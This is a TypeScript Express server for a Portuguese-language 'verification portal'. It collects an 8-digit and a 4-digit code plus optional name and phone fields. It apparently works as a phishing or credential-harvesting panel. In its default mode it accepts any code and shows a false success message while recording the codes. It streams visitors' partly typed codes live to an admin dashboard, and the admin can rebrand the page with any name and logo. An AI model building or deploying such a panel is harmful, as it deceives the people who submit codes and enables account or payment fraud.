import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';
import dotenv from 'dotenv';
import express, { type NextFunction, type Request, type Response } from 'express';

dotenv.config();

type ValidationMode = 'any' | 'strict';

interface AuthorizedCodePair {
  id: string;
  label: string;
  code8: string;
  code4: string;
  active: boolean;
}

interface ExtraFieldConfig {
  id: string;
  label: string;
  placeholder: string;
  type: 'text' | 'email' | 'tel';
  required: boolean;
  enabled: boolean;
}

interface FormConfig {
  brandName: string;
  logoUrl: string;
  authLoadingText: string;
  title: string;
  description: string;
  step1Title: string;
  step1Helper: string;
  step1SuccessTitle: string;
  step1SuccessMessage: string;
  step2Title: string;
  step2Helper: string;
  finalSuccessTitle: string;
  finalSuccessMessage: string;
  validationMode: ValidationMode;
  autoAdvance: boolean;
  maskCode4: boolean;
  extraFields: ExtraFieldConfig[];
}

interface SubmissionRecord {
  id: string;
  protocol: string;
  code8: string;
  code4: string;
  extraData: Record<string, string>;
  status: 'Etapa 1 verificada' | 'Concluído' | 'Recusado';
  reason?: string;
  createdAt: string;
  updatedAt: string;
  durationMs: number;
}

interface AdminCredential {
  salt: string;
  hash: string;
  claimedAt: string;
}

interface StoreData {
  config: FormConfig;
  authorizedPairs: AuthorizedCodePair[];
  submissions: SubmissionRecord[];
  adminCredential: AdminCredential | null;
}

interface OnlineVisitor {
  sessionId: string;
  step: string;
  code8Preview: string;
  lastSeen: number;
}

const DEFAULT_CONFIG: FormConfig = {
  brandName: 'Portal de Verificação',
  logoUrl: '',
  authLoadingText: 'Fazendo autenticação, aguarde...',
  title: 'Verificação de Acesso em Duas Etapas',
  description:
    'Valide seu código principal de 8 dígitos e conclua a confirmação com o código de 4 dígitos.',
  step1Title: 'Informe seu código de 8 dígitos',
  step1Helper: 'Digite ou cole os 8 números do seu código de identificação.',
  step1SuccessTitle: 'Verificado com sucesso',
  step1SuccessMessage:
    'Seu código de 8 dígitos foi validado. Agora prossiga para a etapa final.',
  step2Title: 'Agora informe o código de 4 dígitos',
  step2Helper: 'Digite os 4 dígitos de confirmação para concluir o formulário.',
  finalSuccessTitle: 'Formulário enviado e verificado com sucesso',
  finalSuccessMessage:
    'Os códigos de 8 dígitos e 4 dígitos foram confirmados e registrados no sistema.',
  validationMode: 'any',
  autoAdvance: true,
  maskCode4: false,
  extraFields: [
    {
      id: 'fullName',
      label: 'Nome completo',
      placeholder: 'Ex.: Mariana Oliveira',
      type: 'text',
      required: false,
      enabled: true,
    },
    {
      id: 'contact',
      label: 'Telefone ou WhatsApp',
      placeholder: '(11) 99999-0000',
      type: 'tel',
      required: false,
      enabled: false,
    },
  ],
};

const DEFAULT_PAIRS: AuthorizedCodePair[] = [
  {
    id: 'pair-1',
    label: 'Acesso Padrão 01',
    code8: '48291035',
    code4: '7429',
    active: true,
  },
  {
    id: 'pair-2',
    label: 'Credencial Operacional',
    code8: '90318472',
    code4: '1580',
    active: true,
  },
];

const DATA_DIR = path.resolve(process.cwd(), 'data');
const STORE_PATH = path.resolve(DATA_DIR, 'store.json');
if (!STORE_PATH.startsWith(DATA_DIR + path.sep)) {
  throw new Error('Invalid store path resolution');
}

const SESSION_SECRET =
  process.env.ADMIN_SESSION_SECRET || crypto.randomBytes(32).toString('hex');

const onlineVisitors = new Map<string, OnlineVisitor>();

function pruneVisitors(): OnlineVisitor[] {
  const cutoff = Date.now() - 25_000;
  const active: OnlineVisitor[] = [];
  for (const [key, visitor] of onlineVisitors.entries()) {
    if (visitor.lastSeen < cutoff) {
      onlineVisitors.delete(key);
    } else {
      active.push(visitor);
    }
  }
  active.sort((a, b) => b.lastSeen - a.lastSeen);
  return active;
}

function sanitizeLogoUrl(raw: unknown): string {
  if (typeof raw !== 'string') return '';
  const trimmed = raw.trim();
  if (!trimmed) return '';
  if (trimmed.length > 700_000) return '';

  // Allow safe raster data URIs only (explicitly disallow SVG/HTML)
  if (/^data:image\/(png|jpeg|jpg|webp);base64,[A-Za-z0-9+/=]+$/i.test(trimmed)) {
    return trimmed;
  }

  try {
    const parsed = new URL(trimmed);
    if (parsed.protocol === 'https:' || parsed.protocol === 'http:') {
      return parsed.toString();
    }
  } catch {
    return '';
  }
  return '';
}

function ensureStore(): StoreData {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
  if (!fs.existsSync(STORE_PATH)) {
    const initial: StoreData = {
      config: DEFAULT_CONFIG,
      authorizedPairs: DEFAULT_PAIRS,
      submissions: [],
      adminCredential: null,
    };
    fs.writeFileSync(STORE_PATH, JSON.stringify(initial, null, 2), 'utf8');
    return initial;
  }
  try {
    const raw = fs.readFileSync(STORE_PATH, 'utf8');
    const parsed = JSON.parse(raw) as Partial<StoreData>;
    return {
      config: { ...DEFAULT_CONFIG, ...(parsed.config ?? {}) },
      authorizedPairs: Array.isArray(parsed.authorizedPairs)
        ? parsed.authorizedPairs
        : DEFAULT_PAIRS,
      submissions: Array.isArray(parsed.submissions) ? parsed.submissions : [],
      adminCredential: parsed.adminCredential ?? null,
    };
  } catch {
    const fallback: StoreData = {
      config: DEFAULT_CONFIG,
      authorizedPairs: DEFAULT_PAIRS,
      submissions: [],
      adminCredential: null,
    };
    fs.writeFileSync(STORE_PATH, JSON.stringify(fallback, null, 2), 'utf8');
    return fallback;
  }
}

let store: StoreData = ensureStore();

function persistStore(): void {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
  fs.writeFileSync(STORE_PATH, JSON.stringify(store, null, 2), 'utf8');
}

function getEnvPasscode(): string {
  return (process.env.ADMIN_PASSCODE ?? '').trim();
}

function hashPasscode(passcode: string, salt: string): string {
  return crypto.scryptSync(passcode, salt, 64).toString('hex');
}

function safeEqualStrings(a: string, b: string): boolean {
  const bufA = Buffer.from(a, 'utf8');
  const bufB = Buffer.from(b, 'utf8');
  if (bufA.length !== bufB.length) return false;
  return crypto.timingSafeEqual(bufA, bufB);
}

function verifyPasscode(candidate: string): boolean {
  const envPass = getEnvPasscode();
  if (envPass.length > 0) {
    return safeEqualStrings(candidate, envPass);
  }
  if (!store.adminCredential) {
    return false;
  }
  const derivedHex = hashPasscode(candidate, store.adminCredential.salt);
  const storedBuf = Buffer.from(store.adminCredential.hash, 'hex');
  const derivedBuf = Buffer.from(derivedHex, 'hex');
  if (storedBuf.length !== derivedBuf.length) return false;
  return crypto.timingSafeEqual(storedBuf, derivedBuf);
}

function signSessionToken(): string {
  const payload = Buffer.from(
    JSON.stringify({
      role: 'admin',
      iat: Date.now(),
      exp: Date.now() + 1000 * 60 * 60 * 12,
      nonce: crypto.randomBytes(8).toString('hex'),
    }),
    'utf8'
  ).toString('base64url');

  const sig = crypto
    .createHmac('sha256', SESSION_SECRET)
    .update(payload)
    .digest('base64url');
  return `${payload}.${sig}`;
}

function verifySessionToken(token: string): boolean {
  const parts = token.split('.');
  if (parts.length !== 2) return false;
  const [payload, sig] = parts;
  const expectedSig = crypto
    .createHmac('sha256', SESSION_SECRET)
    .update(payload)
    .digest('base64url');

  if (!safeEqualStrings(sig, expectedSig)) return false;

  try {
    const decoded = JSON.parse(
      Buffer.from(payload, 'base64url').toString('utf8')
    ) as { role?: string; exp?: number };
    if (decoded.role !== 'admin') return false;
    if (typeof decoded.exp !== 'number' || decoded.exp < Date.now()) return false;
    return true;
  } catch {
    return false;
  }
}

function requireAdmin(req: Request, res: Response, next: NextFunction): void {
  const authHeader = req.headers.authorization ?? '';
  const match = /^Bearer\s+(.+)$/i.exec(authHeader);
  if (!match || !verifySessionToken(match[1])) {
    res.status(401).json({ error: 'Sessão administrativa inválida ou expirada.' });
    return;
  }
  next();
}

function makeProtocol(): string {
  const year = new Date().getFullYear();
  const suffix = crypto.randomInt(1000, 9999);
  return `PRT-${year}-${suffix}`;
}

function sanitizeExtraData(
  raw: unknown,
  allowedFields: ExtraFieldConfig[]
): Record<string, string> {
  if (!raw || typeof raw !== 'object') return {};
  const input = raw as Record<string, unknown>;
  const result: Record<string, string> = {};
  for (const field of allowedFields) {
    if (!field.enabled) continue;
    const val = input[field.id];
    if (typeof val === 'string') {
      const trimmed = val.trim().slice(0, 200);
      if (trimmed) {
        result[field.id] = trimmed;
      }
    }
  }
  return result;
}

const app = express();
app.use(express.json({ limit: '1mb' }));

// Public Form Config
app.get('/api/form-config', (_req, res) => {
  res.json({
    config: store.config,
  });
});

// Public Live Presence Heartbeat
app.post('/api/presence', (req, res) => {
  const sessionId =
    typeof req.body?.sessionId === 'string'
      ? req.body.sessionId.replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 64)
      : '';
  const step =
    typeof req.body?.step === 'string'
      ? req.body.step.trim().slice(0, 48)
      : 'Online no formulário';
  const code8Preview =
    typeof req.body?.code8 === 'string'
      ? req.body.code8.replace(/\D/g, '').slice(0, 8)
      : '';

  if (sessionId) {
    onlineVisitors.set(sessionId, {
      sessionId,
      step,
      code8Preview,
      lastSeen: Date.now(),
    });
  }
  res.json({ ok: true });
});

// Public Step 1 Verification (8 digits)
app.post('/api/verify-step1', (req, res) => {
  const rawCode8 = typeof req.body?.code8 === 'string' ? req.body.code8 : '';
  const code8 = rawCode8.replace(/\D/g, '');
  if (!/^\d{8}$/.test(code8)) {
    res.status(400).json({ error: 'Informe exatamente 8 dígitos numéricos.' });
    return;
  }

  const now = new Date().toISOString();

  if (store.config.validationMode === 'strict') {
    const matched = store.authorizedPairs.find(
      (p) => p.active && p.code8 === code8
    );
    if (!matched) {
      const rejected: SubmissionRecord = {
        id: `sub-${crypto.randomUUID()}`,
        protocol: makeProtocol(),
        code8,
        code4: '----',
        extraData: {},
        status: 'Recusado',
        reason: 'Código de 8 dígitos não autorizado',
        createdAt: now,
        updatedAt: now,
        durationMs: 0,
      };
      store.submissions.unshift(rejected);
      persistStore();
      res.status(400).json({
        error:
          'Código de 8 dígitos não encontrado ou inativo. Verifique os números informados.',
      });
      return;
    }
  }

  const record: SubmissionRecord = {
    id: `sub-${crypto.randomUUID()}`,
    protocol: makeProtocol(),
    code8,
    code4: '----',
    extraData: {},
    status: 'Etapa 1 verificada',
    createdAt: now,
    updatedAt: now,
    durationMs: 0,
  };
  store.submissions.unshift(record);
  persistStore();

  res.json({
    ok: true,
    submissionId: record.id,
    protocol: record.protocol,
    code8,
  });
});

// Public Step 2 Verification (4 digits + optional extra fields)
app.post('/api/verify-step2', (req, res) => {
  const submissionId =
    typeof req.body?.submissionId === 'string' ? req.body.submissionId : '';
  const rawCode8 = typeof req.body?.code8 === 'string' ? req.body.code8 : '';
  const rawCode4 = typeof req.body?.code4 === 'string' ? req.body.code4 : '';
  const durationMs =
    typeof req.body?.durationMs === 'number' && Number.isFinite(req.body.durationMs)
      ? Math.max(0, Math.min(3_600_000, Math.round(req.body.durationMs)))
      : 0;

  const code8 = rawCode8.replace(/\D/g, '');
  const code4 = rawCode4.replace(/\D/g, '');

  if (!/^\d{8}$/.test(code8)) {
    res.status(400).json({ error: 'Código de 8 dígitos inválido.' });
    return;
  }
  if (!/^\d{4}$/.test(code4)) {
    res.status(400).json({ error: 'Informe exatamente 4 dígitos numéricos.' });
    return;
  }

  const extraData = sanitizeExtraData(req.body?.extraData, store.config.extraFields);
  for (const field of store.config.extraFields) {
    if (field.enabled && field.required && !extraData[field.id]) {
      res.status(400).json({
        error: `Preencha o campo obrigatório "${field.label}".`,
      });
      return;
    }
  }

  const existing = store.submissions.find(
    (s) => s.id === submissionId && s.code8 === code8
  );
  const now = new Date().toISOString();

  if (store.config.validationMode === 'strict') {
    const matched = store.authorizedPairs.find(
      (p) => p.active && p.code8 === code8 && p.code4 === code4
    );
    if (!matched) {
      if (existing) {
        existing.code4 = code4;
        existing.extraData = extraData;
        existing.status = 'Recusado';
        existing.reason = 'Código de 4 dígitos divergente';
        existing.updatedAt = now;
        existing.durationMs = durationMs;
      } else {
        store.submissions.unshift({
          id: `sub-${crypto.randomUUID()}`,
          protocol: makeProtocol(),
          code8,
          code4,
          extraData,
          status: 'Recusado',
          reason: 'Código de 4 dígitos divergente',
          createdAt: now,
          updatedAt: now,
          durationMs,
        });
      }
      persistStore();
      res.status(400).json({
        error: 'O código de 4 dígitos não corresponde ao código de 8 dígitos informado.',
      });
      return;
    }
  }

  let completed: SubmissionRecord;
  if (existing) {
    existing.code4 = code4;
    existing.extraData = extraData;
    existing.status = 'Concluído';
    existing.reason = undefined;
    existing.updatedAt = now;
    existing.durationMs = durationMs;
    completed = existing;
  } else {
    completed = {
      id: `sub-${crypto.randomUUID()}`,
      protocol: makeProtocol(),
      code8,
      code4,
      extraData,
      status: 'Concluído',
      createdAt: now,
      updatedAt: now,
      durationMs,
    };
    store.submissions.unshift(completed);
  }

  persistStore();
  res.json({ ok: true, record: completed });
});

// Admin Auth Status
app.get('/api/admin/status', (_req, res) => {
  const envConfigured = getEnvPasscode().length > 0;
  const claimed = Boolean(store.adminCredential);
  res.json({
    configured: envConfigured || claimed,
    source: envConfigured ? 'env' : claimed ? 'claimed' : 'unconfigured',
  });
});

// First-run Admin Setup
app.post('/api/admin/setup', (req, res) => {
  if (getEnvPasscode().length > 0 || store.adminCredential !== null) {
    res.status(409).json({
      error: 'A senha administrativa já foi configurada.',
    });
    return;
  }

  const passcode = typeof req.body?.passcode === 'string' ? req.body.passcode.trim() : '';
  if (passcode.length < 4 || passcode.length > 64) {
    res.status(400).json({
      error: 'A senha deve ter entre 4 e 64 caracteres.',
    });
    return;
  }

  const salt = crypto.randomBytes(16).toString('hex');
  const hash = hashPasscode(passcode, salt);
  store.adminCredential = {
    salt,
    hash,
    claimedAt: new Date().toISOString(),
  };
  persistStore();

  res.json({ ok: true, token: signSessionToken() });
});

// Admin Login
app.post('/api/admin/login', (req, res) => {
  const envConfigured = getEnvPasscode().length > 0;
  if (!envConfigured && !store.adminCredential) {
    res.status(409).json({
      error: 'Configure a senha administrativa primeiro.',
    });
    return;
  }

  const passcode = typeof req.body?.passcode === 'string' ? req.body.passcode.trim() : '';
  if (!passcode || !verifyPasscode(passcode)) {
    res.status(401).json({ error: 'Senha incorreta. Tente novamente.' });
    return;
  }

  res.json({ ok: true, token: signSessionToken() });
});

// Protected Admin Dashboard Data
app.get('/api/admin/dashboard', requireAdmin, (_req, res) => {
  res.json({
    config: store.config,
    authorizedPairs: store.authorizedPairs,
    submissions: store.submissions,
    onlineVisitors: pruneVisitors(),
  });
});

// Protected Admin Config Update
app.put('/api/admin/config', requireAdmin, (req, res) => {
  const incoming = req.body?.config as Partial<FormConfig> | undefined;
  if (!incoming || typeof incoming !== 'object') {
    res.status(400).json({ error: 'Configuração inválida.' });
    return;
  }

  const str = (val: unknown, fallback: string, max = 240): string =>
    typeof val === 'string' && val.trim() ? val.trim().slice(0, max) : fallback;

  const extraFields: ExtraFieldConfig[] = Array.isArray(incoming.extraFields)
    ? incoming.extraFields.slice(0, 6).map((f, idx) => ({
        id: typeof f?.id === 'string' ? f.id.slice(0, 40) : `field-${idx}`,
        label: str(f?.label, 'Campo adicional', 80),
        placeholder: typeof f?.placeholder === 'string' ? f.placeholder.slice(0, 100) : '',
        type: f?.type === 'email' || f?.type === 'tel' ? f.type : 'text',
        required: Boolean(f?.required),
        enabled: Boolean(f?.enabled),
      }))
    : store.config.extraFields;

  const nextLogoUrl =
    typeof incoming.logoUrl === 'string'
      ? sanitizeLogoUrl(incoming.logoUrl)
      : store.config.logoUrl;

  store.config = {
    brandName: str(incoming.brandName, store.config.brandName, 80),
    logoUrl: nextLogoUrl,
    authLoadingText: str(incoming.authLoadingText, store.config.authLoadingText, 120),
    title: str(incoming.title, store.config.title, 120),
    description: str(incoming.description, store.config.description, 320),
    step1Title: str(incoming.step1Title, store.config.step1Title, 120),
    step1Helper: str(incoming.step1Helper, store.config.step1Helper, 200),
    step1SuccessTitle: str(incoming.step1SuccessTitle, store.config.step1SuccessTitle, 120),
    step1SuccessMessage: str(
      incoming.step1SuccessMessage,
      store.config.step1SuccessMessage,
      260
    ),
    step2Title: str(incoming.step2Title, store.config.step2Title, 120),
    step2Helper: str(incoming.step2Helper, store.config.step2Helper, 200),
    finalSuccessTitle: str(incoming.finalSuccessTitle, store.config.finalSuccessTitle, 120),
    finalSuccessMessage: str(
      incoming.finalSuccessMessage,
      store.config.finalSuccessMessage,
      260
    ),
    validationMode: incoming.validationMode === 'strict' ? 'strict' : 'any',
    autoAdvance:
      typeof incoming.autoAdvance === 'boolean'
        ? incoming.autoAdvance
        : store.config.autoAdvance,
    maskCode4:
      typeof incoming.maskCode4 === 'boolean'
        ? incoming.maskCode4
        : store.config.maskCode4,
    extraFields,
  };

  persistStore();
  res.json({ ok: true, config: store.config });
});

// Protected Authorized Pairs Update
app.put('/api/admin/pairs', requireAdmin, (req, res) => {
  const incoming = req.body?.authorizedPairs;
  if (!Array.isArray(incoming)) {
    res.status(400).json({ error: 'Lista de códigos inválida.' });
    return;
  }

  const sanitized: AuthorizedCodePair[] = [];
  for (const item of incoming.slice(0, 200)) {
    const code8 = typeof item?.code8 === 'string' ? item.code8.replace(/\D/g, '') : '';
    const code4 = typeof item?.code4 === 'string' ? item.code4.replace(/\D/g, '') : '';
    if (!/^\d{8}$/.test(code8) || !/^\d{4}$/.test(code4)) continue;
    sanitized.push({
      id: typeof item?.id === 'string' ? item.id.slice(0, 50) : `pair-${crypto.randomUUID()}`,
      label:
        typeof item?.label === 'string' && item.label.trim()
          ? item.label.trim().slice(0, 60)
          : 'Credencial',
      code8,
      code4,
      active: Boolean(item?.active),
    });
  }

  store.authorizedPairs = sanitized;
  persistStore();
  res.json({ ok: true, authorizedPairs: store.authorizedPairs });
});

// Protected Submission Deletion
app.delete('/api/admin/submissions/:id', requireAdmin, (req, res) => {
  const id = req.params.id;
  store.submissions = store.submissions.filter((s) => s.id !== id);
  persistStore();
  res.json({ ok: true });
});

app.delete('/api/admin/submissions', requireAdmin, (_req, res) => {
  store.submissions = [];
  persistStore();
  res.json({ ok: true });
});

async function startServer() {
  const port = Number(process.env.PORT) || 3000;
  const isProd = process.env.NODE_ENV === 'production';

  if (!isProd) {
    const { createServer: createViteServer } = await import('vite');
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distDir = path.resolve(process.cwd(), 'dist');
    app.use(express.static(distDir));
    app.get('*', (_req, res) => {
      res.sendFile(path.resolve(distDir, 'index.html'));
    });
  }

  app.listen(port, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${port}`);
  });
}

startServer();
